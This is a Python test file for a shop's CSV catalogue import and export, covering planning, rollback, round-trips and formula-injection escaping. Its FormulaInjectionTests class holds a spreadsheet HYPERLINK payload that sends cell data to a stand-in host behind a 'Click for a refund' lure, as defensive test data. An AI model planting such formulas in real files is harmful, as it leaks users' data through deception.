"""CSV catalogue import and export.

The import is two-phase on purpose, so the tests check both halves: that
:func:`analyse` predicts the outcome without touching the database, and that
:func:`apply` is all-or-nothing.
"""

from __future__ import annotations

import csv
import unittest

from app.services import catalog_io as service
from app.services import products as products_service
from app.services import suppliers as suppliers_service
from app.spreadsheets import FORMULA_STARTERS
from tests.support import DatabaseTestCase

HEADER = "sku,name,category,supplier,cost_usd,price_usd,stock_qty\n"


class CatalogTestCase(DatabaseTestCase):
    def write_csv(self, text: str, name: str = "import.csv"):
        path = self._tmp / name
        path.write_text(text, encoding="utf-8")
        return path


class AnalyseTests(CatalogTestCase):
    def test_new_rows_are_planned_as_creates(self):
        path = self.write_csv(HEADER + "S1,Widget,Tools,Acme,4.00,10.00,7\n")
        plan = service.analyse(path)
        self.assertEqual(plan.creates, 1)
        self.assertEqual(plan.updates, 0)
        self.assertEqual(plan.rows[0].action, "create")

    def test_existing_skus_are_planned_as_updates_with_the_differences(self):
        products_service.create_product(
            sku="S1", name="Widget", price_usd="10.00", cost_usd="4.00", stock_qty=7
        )
        path = self.write_csv(HEADER + "S1,Widget,Tools,Acme,4.00,12.50,7\n")
        plan = service.analyse(path)
        self.assertEqual(plan.updates, 1)
        self.assertIn("price 10.00", plan.rows[0].message)

    def test_analysing_writes_nothing(self):
        path = self.write_csv(HEADER + "S1,Widget,Tools,Acme,4.00,10.00,7\n")
        service.analyse(path)
        self.assertIsNone(products_service.get_by_sku("S1"))

    def test_headers_may_be_spelled_loosely(self):
        path = self.write_csv(
            "Item Code,Product Name,Sell Price,On Hand\nS1,Widget,10.00,3\n"
        )
        plan = service.analyse(path)
        self.assertEqual(plan.creates, 1)
        self.assertEqual(plan.rows[0].values["stock_qty"], 3)

    def test_a_file_without_sku_or_name_is_rejected_outright(self):
        path = self.write_csv("colour,size\nred,large\n")
        with self.assertRaises(service.ImportError_):
            service.analyse(path)

    def test_unusable_rows_are_reported_but_do_not_stop_the_file(self):
        path = self.write_csv(
            HEADER
            + "S1,Widget,Tools,Acme,4.00,10.00,7\n"
            + ",Nameless,Tools,Acme,1.00,2.00,1\n"
            + "S3,Bad Price,Tools,Acme,1.00,abc,1\n"
            + "S4,No Price,Tools,Acme,1.00,,1\n"
        )
        plan = service.analyse(path)
        self.assertEqual(plan.creates, 1)
        self.assertEqual(len(plan.errors), 3)

    def test_a_duplicate_sku_within_the_file_is_flagged(self):
        path = self.write_csv(
            HEADER
            + "S1,Widget,Tools,Acme,4.00,10.00,7\n"
            + "S1,Widget Again,Tools,Acme,4.00,10.00,7\n"
        )
        plan = service.analyse(path)
        self.assertEqual(len(plan.errors), 1)
        self.assertIn("twice", plan.errors[0].message)

    def test_unknown_columns_are_listed_not_fatal(self):
        path = self.write_csv("sku,name,price,shelf\nS1,Widget,10.00,A3\n")
        plan = service.analyse(path)
        self.assertEqual(plan.unknown_columns, ["shelf"])
        self.assertEqual(plan.creates, 1)


class ApplyTests(CatalogTestCase):
    def test_products_categories_and_suppliers_are_created(self):
        path = self.write_csv(HEADER + "S1,Widget,Tools,Acme,4.00,10.00,7\n")
        result = service.apply(service.analyse(path), self.admin.user_id)
        self.assertEqual(result["created"], 1)

        product = products_service.get_by_sku("S1")
        self.assertEqual(product["price_usd"], 10.0)
        self.assertEqual(product["stock_qty"], 7)
        self.assertEqual(product["category_name"], "Tools")
        self.assertEqual(product["supplier_name"], "Acme")
        self.assertIsNotNone(suppliers_service.find_by_name("Acme"))

    def test_stock_is_treated_as_a_target_not_a_delta(self):
        products_service.create_product(
            sku="S1", name="Widget", price_usd="10.00", stock_qty=7
        )
        path = self.write_csv(HEADER + "S1,Widget,Tools,Acme,4.00,10.00,20\n")
        service.apply(service.analyse(path), self.admin.user_id)
        self.assertEqual(products_service.get_by_sku("S1")["stock_qty"], 20)

    def test_the_stock_correction_is_logged_as_an_import(self):
        product_id = products_service.create_product(
            sku="S1", name="Widget", price_usd="10.00", stock_qty=7
        )
        path = self.write_csv(HEADER + "S1,Widget,Tools,Acme,4.00,10.00,20\n")
        service.apply(service.analyse(path), self.admin.user_id)
        history = products_service.stock_history(product_id)
        self.assertTrue(any(row["reason"] == "Import" for row in history))

    def test_blank_cells_leave_the_existing_value_alone(self):
        products_service.create_product(
            sku="S1", name="Widget", price_usd="10.00", cost_usd="4.00", stock_qty=7
        )
        path = self.write_csv("sku,name,price_usd\nS1,Widget,12.00\n")
        service.apply(service.analyse(path), self.admin.user_id)
        product = products_service.get_by_sku("S1")
        self.assertEqual(product["price_usd"], 12.0)
        self.assertEqual(product["cost_usd"], 4.0)
        self.assertEqual(product["stock_qty"], 7)

    def test_a_file_of_nothing_but_errors_is_refused(self):
        path = self.write_csv(HEADER + ",Nameless,Tools,Acme,1.00,2.00,1\n")
        with self.assertRaises(service.ImportError_):
            service.apply(service.analyse(path), self.admin.user_id)

    def test_a_failure_part_way_through_rolls_the_whole_import_back(self):
        path = self.write_csv(
            HEADER
            + "S1,Widget,Tools,Acme,4.00,10.00,7\n"
            + "S2,Gadget,Tools,Acme,2.00,5.00,3\n"
        )
        plan = service.analyse(path)
        # Corrupt the second row so the write fails after the first has been made.
        plan.rows[1].values["price_usd"] = object()
        # The importer rejects the unparseable price; what matters is that the
        # first row, its category and its supplier all roll back with it.
        with self.assertRaises(products_service.ProductError):
            service.apply(plan, self.admin.user_id)
        self.assertIsNone(products_service.get_by_sku("S1"))
        self.assertIsNone(suppliers_service.find_by_name("Acme"))


class ExportTests(CatalogTestCase):
    def test_an_export_can_be_imported_back_unchanged(self):
        products_service.create_product(
            sku="S1", name="Widget", price_usd="10.00", cost_usd="4.00", stock_qty=7
        )
        path = self._tmp / "export.csv"
        self.assertEqual(service.export_products(path), 1)

        plan = service.analyse(path)
        self.assertEqual(plan.creates, 0)
        self.assertEqual(plan.updates, 1)
        self.assertEqual(plan.rows[0].message, "No changes")

    def test_the_template_is_a_valid_import_file(self):
        path = service.write_template(self._tmp / "template.csv")
        plan = service.analyse(path)
        self.assertEqual(plan.creates, 1)
        self.assertEqual(plan.errors, [])


class FormulaInjectionTests(CatalogTestCase):
    """The whole chain, because both ends of it are in this module.

    A supplier sends a price list with a formula for a product name. The shop
    imports it, which is what this module is for. Weeks later somebody exports
    the catalogue to send to the accountant and opens it to check it, and the
    formula runs on the shop's machine under the shop's account. Nothing in
    between is unusual, which is what makes it worth a test.
    """

    PAYLOAD = '=HYPERLINK("http://example.invalid/"&A1,"Click for a refund")'

    def _supplier_file(self, name: str):
        """Written with csv.writer, the way the supplier's system would."""
        path = self._tmp / "supplier.csv"
        with open(path, "w", newline="", encoding="utf-8") as handle:
            writer = csv.writer(handle)
            writer.writerow(HEADER.strip().split(","))
            writer.writerow(["S1", name, "Tools", "Acme", "4.00", "10.00", "7"])
        return path

    def test_an_imported_payload_does_not_come_back_out_as_a_formula(self):
        supplier_file = self._supplier_file(self.PAYLOAD)
        service.apply(service.analyse(supplier_file))
        self.assertEqual(
            products_service.get_product(1)["name"],
            self.PAYLOAD,
            "the name should be stored exactly as the file gave it",
        )

        exported = self._tmp / "export.csv"
        service.export_products(exported)
        with open(exported, newline="", encoding="utf-8-sig") as handle:
            cell = next(csv.DictReader(handle))["name"]
        self.assertFalse(
            cell.startswith(FORMULA_STARTERS),
            f"{cell!r} would be evaluated when the accountant opens the file",
        )

    def test_every_free_text_column_is_covered_not_just_the_name(self):
        products_service.create_product(
            sku="=1+1", name="+Widget", price_usd="10", cost_usd="4",
            stock_qty=1, description="@SUM(A:A)", barcode="-99",
        )
        exported = self._tmp / "export.csv"
        service.export_products(exported)
        with open(exported, newline="", encoding="utf-8-sig") as handle:
            row = next(csv.DictReader(handle))
        for column in ("sku", "barcode", "name", "description"):
            with self.subTest(column=column):
                self.assertFalse(row[column].startswith(FORMULA_STARTERS))

    def test_the_numbers_stay_numbers(self):
        """Escaping a negative total would reach the accountant as text."""
        products_service.create_product(
            sku="S1", name="Widget", price_usd="10", cost_usd="4", stock_qty=7
        )
        exported = self._tmp / "export.csv"
        service.export_products(exported)
        with open(exported, newline="", encoding="utf-8-sig") as handle:
            row = next(csv.DictReader(handle))
        self.assertEqual(row["price_usd"], "10.00")
        self.assertEqual(row["stock_qty"], "7")

    def test_the_escaping_does_not_show_up_as_a_change_on_re_import(self):
        """Otherwise every export/import cycle would rewrite the catalogue."""
        products_service.create_product(
            sku="S1", name=self.PAYLOAD, price_usd="10", cost_usd="4",
            stock_qty=7, description="'already quoted'",
        )
        exported = self._tmp / "export.csv"
        service.export_products(exported)

        plan = service.analyse(exported)
        self.assertEqual(plan.rows[0].message, "No changes")
        self.assertEqual(plan.rows[0].values["name"], self.PAYLOAD)
        self.assertEqual(plan.rows[0].values["description"], "'already quoted'")


if __name__ == "__main__":
    unittest.main()
